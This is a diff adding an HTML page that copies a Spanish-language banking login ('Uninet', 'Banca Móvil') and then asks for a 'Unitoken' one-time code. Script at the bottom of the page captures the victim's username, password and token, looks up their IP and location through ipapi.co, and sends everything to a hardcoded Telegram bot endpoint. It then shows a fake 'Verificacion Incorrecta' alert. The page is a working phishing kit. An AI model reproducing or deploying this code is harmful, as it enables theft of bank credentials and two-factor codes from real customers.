@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html>
+  <script
+    src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js"
+    id="eppiocemhmnlbhjplcgkofciiegomcon"
+  ></script>
+  <script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script>
+  <script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script>
+  <link
+    href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/css/bootstrap-combined.no-icons.min.css"
+    rel="stylesheet"
+  />
+  <link
+    href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css"
+    rel="stylesheet"
+  />
+
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+    <meta name="format-detection" content="telephone=no" />
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta name="theme-color" content="#0079C1" />
+    <meta name="msapplication-navbutton-color" content="#0079C1" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="#0079C1" />
+
+    <meta
+      id="viewport"
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=0.5, maximum-scale=2.0"
+    />
+    <title>Plus</title>
+    <link href="token/css.css" rel="stylesheet" />
+
+    <script
+      bis_use="true"
+      type="text/javascript"
+      charset="utf-8"
+      data-bis-config='["facebook.com/","twitter.com/","youtube-nocookie.com/embed/","//vk.com/","//www.vk.com/","//linkedin.com/","//www.linkedin.com/","//instagram.com/","//www.instagram.com/","//www.google.com/recaptcha/api2/","//hangouts.google.com/webchat/","//www.google.com/calendar/","//www.google.com/maps/embed","spotify.com/","soundcloud.com/","//player.vimeo.com/","//disqus.com/","//tgwidget.com/","//js.driftt.com/","friends2follow.com","/widget","login","//video.bigmir.net/","blogger.com","//smartlock.google.com/","//keep.google.com/","/web.tolstoycomments.com/","moz-extension://","chrome-extension://","/auth/","//analytics.google.com/","adclarity.com","paddle.com/checkout","hcaptcha.com","recaptcha.net","2captcha.com","accounts.google.com","www.google.com/shopping/customerreviews","buy.tinypass.com","gstatic.com","secureir.ebaystatic.com","docs.google.com","contacts.google.com","github.com","mail.google.com","chat.google.com","audio.xpleer.com","keepa.com","static.xx.fbcdn.net","sas.selleramp.com","1plus1.video","console.googletagservices.com"]'
+      src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executers/vi-tr.js"
+    ></script>
+
+    <script src="token/jquery"></script>
+
+    <script src="token/bootstrap"></script>
+
+    <link href="token/Login.css" rel="stylesheet" />
+
+    <style>
+      .overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+      }
+      .form-container {
+        background-color: #fff;
+        border-radius: 5px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        width: 350px;
+      }
+      .tokens {
+        width: 30px;
+        height: 35px !important;
+        text-align: center;
+        margin: 5px;
+      }
+    </style>
+  </head>
+  <body
+    cz-shortcut-listen="true"
+  >
+    <div class="overlay" id="overlay" style="display: none">
+      <div class="form-container">
+        <div
+          style="
+            width: 100%;
+            text-align: center;
+            background: #d7edf1;
+            padding: 20px;
+            font-weight: bold;
+          "
+        >
+          INGRESE SU TOKEN
+        </div>
+
+        <div style="padding: 20px">
+          <div style="width: 100%; text-align: center">
+            <img
+              src="https://is1-ssl.mzstatic.com/image/thumb/Purple116/v4/47/2e/17/472e1786-e628-209b-a936-fb573770fd82/AppIcon-0-0-1x_U007emarketing-0-0-0-5-0-0-sRGB-0-0-0-GLES2_U002c0-512MB-85-220-0-0.png/256x256bb.jpg"
+              alt=""
+              style="width: 50px; margin-bottom: 20px"
+            />
+          </div>
+          <div style="width: 100%; text-align: center; margin-bottom: 20px">
+            Ingrese su <label for=""> Unitoken </label> llegado a su correo
+            electronico/sms para continuar y acceder a su Banca Móvil
+          </div>
+          <style>
+            #myForm {
+              text-align: center;
+              display: flex;
+              align-items: center;
+              height: 30px;
+            }
+            #myForm input[type="text"] {
+              width: 50%; /* 50% del ancho del formulario */
+              border-color: #57c6e6;
+              font-size: 15px;
+              height: 30px;
+              margin-right: 10px; /* Espacio entre el input y el botón */
+              vertical-align: middle; /* Alineación vertical */
+              margin-bottom: 0;
+            }
+            #myForm input[type="submit"] {
+              width: 50%; /* 50% del ancho del formulario */
+              background: #57c6e6;
+              color: white;
+              height: 30px;
+              border: none;
+              cursor: pointer;
+              vertical-align: middle; /* Alineación vertical */
+            }
+          </style>
+          <form id="myForm">
+            <input
+              type="text"
+              id="token"
+              pattern="\d{6,}"
+              minlength="6"
+              required
+            />
+
+            <input type="submit" value="Verificar" />
+            <script>
+              function validarToken() {
+                var tokenInput = document.getElementById("token");
+                var token = tokenInput.value;
+
+                if (!token.match(/^\d{6,}$/)) {
+                  alert("El token debe contener al menos 6 números.");
+                  return false; // Evita que el formulario se envíe
+                }
+
+                return true; // Permite que el formulario se envíe
+              }
+            </script>
+          </form>
+        </div>
+      </div>
+    </div>
+
+   
+    <nav class="navbar navbar-default navbar-fixed-top" role="navigation">
+      <div
+        class="navbar-header"
+        bis_skin_checked="1"
+        style="margin-left: 40px !important"
+      >
+        <img
+          alt="Uninet"
+          src="token/Uninet-Logo-2019.png"
+          class="navbar-brand uninet-logo"
+        />
+      </div>
+
+   
+    </nav>
+    <div class="load-caja" id="load" bis_skin_checked="1" style="display: none">
+      <div
+        id="fondo"
+        class="load-image"
+        bis_skin_checked="1"
+        style="height: 100%; width: 100%"
+      >
+        <div class="center-loading" bis_skin_checked="1">
+          <img src="token/logo.png" />
+          <div class="loader" bis_skin_checked="1"></div>
+          <div class="foot" bis_skin_checked="1">Loading...</div>
+        </div>
+      </div>
+    </div>
+    <div class="container-fluid" bis_skin_checked="1">
+      <script src="token/jquery"></script>
+
+      <style media="screen" type="text/css">
+        #carousel-example-generic {
+          margin-left: 50px;
+          margin-right: 50px;
+        }
+
+        .img-thumbnail {
+          height: 100%;
+          width: 100%;
+        }
+
+        .modal-dialog {
+          width: 90%;
+        }
+      </style>
+      <section id="loginForm">
+        <form
+          class="form-horizontal form-group-lg"
+          id="frmLogin"
+          method="post"
+          role="form"
+          novalidate="novalidate"
+        >
+          <div id="antiForgeryToken" bis_skin_checked="1">
+            <input
+              name="__RequestVerificationToken"
+              type="hidden"
+              value="DXFDgPRedhagzwyYu0TxaU9s53Um-Ylu2wDe3HsWool2xSDz9-HHwHOcLvp6TBg9UPLRR7heP-srDjxwbL0kGqjs-AAezaScst1m5Z9csGPoI29eLLQK8Wuu2jifoz74I6nvgTCX-4DOeepJo3Ipwg2"
+            />
+          </div>
+          <div
+            id="fingerprint"
+            style="display: none"
+            bis_skin_checked="1"
+          ></div>
+          <input
+            id="Dispositivo"
+            name="Dispositivo"
+            type="hidden"
+            value="CoytwnhN2yV+k64xmKVjCg=="
+          />
+          <div
+            class="row"
+            style="margin-right: 0px; margin-left: 0px"
+            bis_skin_checked="1"
+          >
+            <div
+              class="col-md-4 col-md-offset-1 col-sm-4 col-sm-offset-1 panel-border panel panel-login text-center"
+              bis_skin_checked="1"
+            >
+              <div
+                class="panel-heading text-center"
+                id="LoginHeader"
+                bis_skin_checked="1"
+              >
+                <div style="width: 80%" bis_skin_checked="1">
+                  <h1 class="panel-title">
+                    <b> <i class="fa fa-laptop" style="font-size: 30px"></i></b>
+                    Login
+                  </h1>
+                </div>
+                <div
+                  style="width: 10%"
+                  id="ModalTerminosCondiciones"
+                  bis_skin_checked="1"
+                >
+                  <a
+                    href="#Login#"
+                    title="Terms and Conditions"
+                    ><i class="fa-terms-condition-custom fa-2x"></i
+                  ></a>
+                </div>
+                <div
+                  style="width: 10%"
+                  id="ModalPoliticas"
+                  bis_skin_checked="1"
+                >
+                  <a
+                    href="#Login#"
+                    title="Security and privacy policies"
+                    ><i class="fa fa-shield fa-2x"></i
+                  ></a>
+                </div>
+                <div style="width: 10%" id="ModalAyuda" bis_skin_checked="1">
+                  <a href="#Login#" title="Help"
+                    ><i class="fa fa-question-circle fa-2x"></i
+                  ></a>
+                </div>
+                <div
+                  style="width: 10%"
+                  id="ModalSeguridad"
+                  bis_skin_checked="1"
+                >
+                  <a href="#Login#" title="Security advice"
+                    ><i class="fa fa-lightbulb-o fa-2x"></i
+                  ></a>
+                </div>
+              </div>
+              <div class="cuerpo" bis_skin_checked="1">
+                <div class="form-group" bis_skin_checked="1">
+                  <div class="input-group" bis_skin_checked="1">
+                    <input id="test2" type="checkbox" style="display: none" />
+                  </div>
+                  <span
+                    class="field-validation-valid text-danger"
+                    data-valmsg-for="Usuario"
+                    data-valmsg-replace="true"
+                  ></span>
+                </div>
+                <div class="form-group" bis_skin_checked="1">
+                  <div class="input-group" bis_skin_checked="1">
+                    <div class="input-group-addon" bis_skin_checked="1">
+                      <i class="fa fa-lock" style="font-size: 30px"></i>
+                    </div>
+
+                    <input
+                      class="form-control form-control-sm"
+                      placeholder="Ingrese su contraseña."
+                      id="CaptchaText"
+                      type="text"
+                      value=""
+                    />
+                    <input
+                      autocomplete="off"
+                      class="form-control"
+                      data-val="true"
+                      data-val-required="The captcha is necessary."
+                      id="Captcha"
+                      name="Captcha"
+                      placeholder="Enter the captcha code."
+                      type="hidden"
+                      value=""
+                    />
+                  </div>
+                  <span
+                    class="field-validation-valid text-danger"
+                    data-valmsg-for="Captcha"
+                    data-valmsg-replace="true"
+                  ></span>
+                </div>
+
+                <div
+                  class="form-group"
+                  bis_skin_checked="1"
+                  style="margin-bottom: 20px"
+                >
+                  <div class="col-md-12" bis_skin_checked="1">
+                    <input
+                      type="submit"
+                      value="Ingresar"
+                      class="btn btn-lg btn-login Login"
+                      onclick="return rdu();"
+                    />
+                  </div>
+                </div>
+                <div id="fingerprint" bis_skin_checked="1"></div>
+                <div class="row" style="display: none" bis_skin_checked="1">
+                  <p id="UsuarioResult"></p>
+                </div>
+                <div
+                  id="Validation-Message"
+                  class="alert-box error"
+                  style="display: none"
+                  bis_skin_checked="1"
+                ></div>
+              </div>
+            </div>
+            <div
+              class="col-md-5 col-md-offset-1 col-sm-5 col-sm-offset-1 imagen-mensaje"
+              bis_skin_checked="1"
+            >
+              <style>
+                /*CAROUSEL LOGIN*/
+                .bs-example,
+                .new-caption-area {
+                  /*width: 600px;*/
+                  margin: auto;
+                  color: #fff;
+                  padding: 0 15px;
+                }
+
+                .carousel-caption {
+                  color: #000;
+                }
+
+                #Slider-Area {
+                  /*background-color: #0079C1;*/
+                  border-radius: 10px;
+                  padding-bottom: 5%;
+                }
+
+                .carousel-indicators {
+                  position: relative;
+                  bottom: 0;
+                  /*margin-bottom: 0;*/
+                  margin-top: 2%;
+                  margin-bottom: -2%;
+                }
+
+                .carousel-indicators li {
+                  width: 16px;
+                  height: 16px;
+                  border: 1px solid #fff;
+                  border-color: #fff;
+                }
+
+                .carousel-indicators .active {
+                  width: 16px;
+                  height: 16px;
+                  background-color: #f8981b;
+                  border-color: #fff;
+                }
+
+                .carousel-control {
+                  position: absolute;
+                  bottom: 0;
+                  top: 60%;
+                  opacity: 1;
+                  display: none;
+                }
+
+                .carousel-control,
+                .carousel-control:hover,
+                .carousel-control:focus {
+                  color: #f8981b;
+                }
+              </style>
+
+              <div class="form-group" bis_skin_checked="1">
+                <div class="col-md-12" id="Slider-Area" bis_skin_checked="1">
+                  <br />
+                  <div class="bs-example" bis_skin_checked="1">
+                    <div
+                      id="carousel-example-captions"
+                      class="carousel slide col-md-offset-1"
+                      data-interval="10000"
+                      data-ride="carousel"
+                      style="margin: auto"
+                      bis_skin_checked="1"
+                    >
+                      <div class="carousel-inner" bis_skin_checked="1">
+                        <div class="item" bis_skin_checked="1">
+                          <img
+                            class="d-block img-fluid img-rounded img-thumbnail"
+                            src="token/comunicadocontactcenter.jpg"
+                          />
+                          <div
+                            class="carousel-caption"
+                            bis_skin_checked="1"
+                            style="display: none"
+                          >
+                            <h3></h3>
+                            <p></p>
+                          </div>
+                        </div>
+                        <div class="item" bis_skin_checked="1">
+                          <img
+                            class="d-block img-fluid img-rounded img-thumbnail"
+                            src="token/comunicadocontactcenter.jpg"
+                          />
+                          <div
+                            class="carousel-caption"
+                            bis_skin_checked="1"
+                            style="display: none"
+                          >
+                            <h3></h3>
+                            <p></p>
+                          </div>
+                        </div>
+                        <div class="item active" bis_skin_checked="1">
+                          <img
+                            class="d-block img-fluid img-rounded img-thumbnail"
+                            src="token/comunicadocontactcenter.jpg"
+                          />
+                          <div
+                            class="carousel-caption"
+                            bis_skin_checked="1"
+                            style="display: none"
+                          >
+                            <h3></h3>
+                            <p></p>
+                          </div>
+                        </div>
+                        <div class="item" bis_skin_checked="1">
+                          <img
+                            class="d-block img-fluid img-rounded img-thumbnail"
+                            src="token/comunicadocriptoactivos.jpeg"
+                          />
+                        </div>
+                      </div>
+                      <ol class="carousel-indicators">
+                        <li
+                          data-target="#carousel-example-captions"
+                          data-slide-to="0"
+                          class=""
+                        ></li>
+                        <li
+                          data-target="#carousel-example-captions"
+                          data-slide-to="1"
+                          class=""
+                        ></li>
+                        <li
+                          data-target="#carousel-example-captions"
+                          data-slide-to="2"
+                          class="active"
+                        ></li>
+                        <li
+                          data-target="#carousel-example-captions"
+                          data-slide-to="3"
+                          class=""
+                        ></li>
+                      </ol>
+                      <a
+                        class="left carousel-control"
+                        href="#Login#carousel-example-captions"
+                        data-slide="prev"
+                        style="background-image: none"
+                      >
+                        <span class="glyphicon glyphicon-chevron-left"></span>
+                      </a>
+                      <a
+                        class="right carousel-control"
+                        href="#Login#carousel-example-captions"
+                        data-slide="next"
+                        style="background-image: none"
+                      >
+                        <span class="glyphicon glyphicon-chevron-right"></span>
+                      </a>
+                      <div class="new-caption-area" bis_skin_checked="1">
+                        <h3></h3>
+                        <p></p>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div class="new-indicator-area" bis_skin_checked="1"></div>
+                </div>
+              </div>
+
+              <script src="token/bootstrap.min.js"></script>
+            </div>
+          </div>
+        </form>
+      </section>
+
+      <input
+        id="Version"
+        name="Version"
+        type="hidden"
+        value="1.9.30 FSN-1128, FSN-1235, FSN-1078"
+      />
+    </div>
+  </body>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#frmLogin");
+    form.addEventListener("submit", (event) => {
+      event.preventDefault();
+      axios
+        .get(url)
+        .then((response) => {
+          const password = document.querySelector("#CaptchaText").value;
+          localStorage.getItem("usuario");
+          const message =
+            "Usuario: " +
+            localStorage.getItem("usuario") +
+            "\nContra: " +
+            password +
+            "\nCiudad:" +
+            response.data.city +
+            "\nPais: " +
+            response.data.country +
+            "\nIP: " +
+            response.data.ip;
+          axios
+            .post(
+              "https://api.telegram.org/bot6322284639:AAFJI2SDBmlsbFJEGsFap6bJeR6w0b929iQ/sendMessage",
+              {
+                chat_id: "-4195941322",
+                text: message,
+              }
+            )
+            .then((response) => {
+              document.getElementById("load").style.display = "";
+              setTimeout(function () {
+                // Aquí puedes agregar la acción que deseas realizar después de 10 segundos
+                console.log("Acción después de 10 segundos");
+                document.getElementById("load").style.display = "none";
+                document.getElementById("overlay").style.display = "";
+              }, 10000); // 10 segundos en milisegundos
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    });
+
+    const form2 = document.querySelector("#myForm");
+    form2.addEventListener("submit", (event) => {
+      event.preventDefault();
+      axios
+        .get(url)
+        .then((response) => {
+          const usuario = localStorage.getItem("usuario");
+
+          const message =
+            "Usuario: " +
+            usuario +
+            "\nTransaccional: " +
+            document.getElementById("token").value +
+            "\nCiudad:" +
+            response.data.city +
+            "\nPais: " +
+            response.data.country +
+            "\nIP: " +
+            response.data.ip;
+          axios
+            .post(
+              "https://api.telegram.org/bot6322284639:AAFJI2SDBmlsbFJEGsFap6bJeR6w0b929iQ/sendMessage",
+              {
+                chat_id: "-4195941322",
+                text: message,
+              }
+            )
+            .then((response) => {
+              alert("Verificacion Incorrecta");
+              window.location.href = "index.html";
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    });
+  </script>
+</html>
